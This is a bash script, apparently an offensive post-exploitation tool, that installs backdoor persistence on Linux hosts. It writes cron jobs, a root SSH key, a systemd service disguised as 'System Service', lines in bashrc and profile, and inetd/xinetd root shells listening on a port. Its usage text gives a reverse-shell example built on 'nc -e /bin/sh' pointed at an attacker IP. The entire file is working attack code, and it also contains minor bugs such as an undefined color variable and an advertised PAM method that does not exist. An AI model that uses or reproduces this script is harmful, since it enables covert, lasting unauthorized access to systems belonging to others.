#!/bin/bash
# Linux Persistence - Multiple Methods
# Install various persistence mechanisms

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

usage() {
    echo -e "${GREEN}Linux Persistence Generator${NC}"
    echo "Usage: $0 <method> [options]"
    echo ""
    echo "Methods:"
    echo "  cron      Add cron job persistence"
    echo "  ssh       Add SSH key persistence"
    echo "  systemd   Create systemd service"
    echo "  bashrc    Add to bashrc"
    echo "  profile   Add to profile"
    echo "  inetd     Configure inetd/xinetd"
    echo "  PAM       Configure PAM (requires root)"
    echo ""
    echo "Example:"
    echo "  $0 cron 'nc -e /bin/sh 10.10.10.10 4444'"
    echo "  $0 ssh 'ssh-rsa AAAAB3... root@kali'"
}

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${RED}[!] This method requires root privileges${NC}"
        exit 1
    fi
}

cron_persistence() {
    local command="$1"

    echo -e "${GREEN}[*] Adding cron job persistence${NC}"
    echo -e "${YELLOW}Command: $command${NC}"

    # Add to crontab
    (crontab -l 2>/dev/null | grep -v "$command"; echo "* * * * * $command") | crontab -

    # Also add specific cron locations
    echo "* * * * * $command" >> /etc/cron.d/backdoor 2>/dev/null || \
        echo -e "${Y}[!] Cannot write to /etc/cron.d (not root)${NC}"

    echo -e "${GREEN}[+] Cron persistence added${NC}"
}

ssh_persistence() {
    local ssh_key="$1"
    local ssh_dir="/root/.ssh"

    echo -e "${GREEN}[*] Adding SSH key persistence${NC}"

    # Create .ssh directory
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"

    # Add key to authorized_keys
    if [ -f "$ssh_dir/authorized_keys" ]; then
        if ! grep -qF "$ssh_key" "$ssh_dir/authorized_keys"; then
            echo "$ssh_key" >> "$ssh_dir/authorized_keys"
            echo -e "${GREEN}[+] SSH key added${NC}"
        else
            echo -e "${YELLOW}[!] SSH key already exists${NC}"
        fi
    else
        echo "$ssh_key" > "$ssh_dir/authorized_keys"
        echo -e "${GREEN}[+] SSH key added${NC}"
    fi

    chmod 600 "$ssh_dir/authorized_keys"
    chmod 644 "$ssh_dir/known_hosts" 2>/dev/null
}

systemd_persistence() {
    local name="${1:-backdoor}"
    local command="$2"

    check_root

    echo -e "${GREEN}[*] Creating systemd service: $name${NC}"

    cat > "/etc/systemd/system/${name}.service" << EOF
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '$command'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$name"
    systemctl start "$name"

    echo -e "${GREEN}[+] Systemd service $name created and enabled${NC}"
}

bashrc_persistence() {
    local command="$1"

    echo -e "${GREEN}[*] Adding persistence to bashrc${NC}"

    # Add to /etc/bash.bashrc for all users
    if [ -f /etc/bash.bashrc ]; then
        if ! grep -qF "$command" /etc/bash.bashrc; then
            echo "" >> /etc/bash.bashrc
            echo "# Persistence" >> /etc/bash.bashrc
            echo "$command" >> /etc/bash.bashrc
            echo -e "${GREEN}[+] Added to /etc/bash.bashrc${NC}"
        fi
    fi

    # Add to current user's bashrc
    if [ -f "$HOME/.bashrc" ]; then
        if ! grep -qF "$command" "$HOME/.bashrc"; then
            echo "" >> "$HOME/.bashrc"
            echo "# Persistence" >> "$HOME/.bashrc"
            echo "$command" >> "$HOME/.bashrc"
            echo -e "${GREEN}[+] Added to ~/.bashrc${NC}"
        fi
    fi
}

profile_persistence() {
    local command="$1"

    echo -e "${GREEN}[*] Adding persistence to system profiles${NC}"

    # Add to /etc/profile
    if [ -f /etc/profile ]; then
        if ! grep -qF "$command" /etc/profile; then
            echo "" >> /etc/profile
            echo "# Persistence" >> /etc/profile
            echo "$command" >> /etc/profile
            echo -e "${GREEN}[+] Added to /etc/profile${NC}"
        fi
    fi

    # Add to profile.d for all users
    if [ -d /etc/profile.d ]; then
        echo "$command" > /etc/profile.d/backdoor.sh
        chmod +x /etc/profile.d/backdoor.sh
        echo -e "${GREEN}[+] Added to /etc/profile.d/backdoor.sh${NC}"
    fi
}

inetd_persistence() {
    local port="$1"
    local command="$2"

    check_root

    echo -e "${GREEN}[*] Configuring inetd backdoor on port $port${NC}"

    # Check if inetd is available
    if command -v inetd >/dev/null 2>&1; then
        echo "stream tcp nowait root /bin/bash bash -c '$command'" >> /etc/inetd.conf
        echo "backdoor stream tcp nowait root /bin/sh sh -i" >> /etc/inetd.conf 2>/dev/null || \
        echo -e "${Y}[!] Manual inetd configuration required${NC}"
        kill -HUP $(cat /var/run/inetd.pid) 2>/dev/null || echo -e "${Y}[!] Restart inetd manually${NC}"
        echo -e "${GREEN}[+] Inetd backdoor configured${NC}"
    elif command -v xinetd >/dev/null 2>&1; then
        cat > "/etc/xinetd.d/backdoor" << EOF
service backdoor
{
    disable = no
    type = UNLISTED
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = /bin/bash
    server_args = -c '$command'
    port = $port
}
EOF
        systemctl restart xinetd
        echo -e "${GREEN}[+] xinetd backdoor configured on port $port${NC}"
    else
        echo -e "${Y}[!] Neither inetd nor xinetd found${NC}"
    fi
}

# Main
METHOD="$1"

case $METHOD in
    cron)
        cron_persistence "$2"
        ;;
    ssh)
        ssh_persistence "$2"
        ;;
    systemd)
        systemd_persistence "$2" "$3"
        ;;
    bashrc)
        bashrc_persistence "$2"
        ;;
    profile)
        profile_persistence "$2"
        ;;
    inetd)
        inetd_persistence "$2" "$3"
        ;;
    -h|--help|help|*)
        usage
        ;;
esac
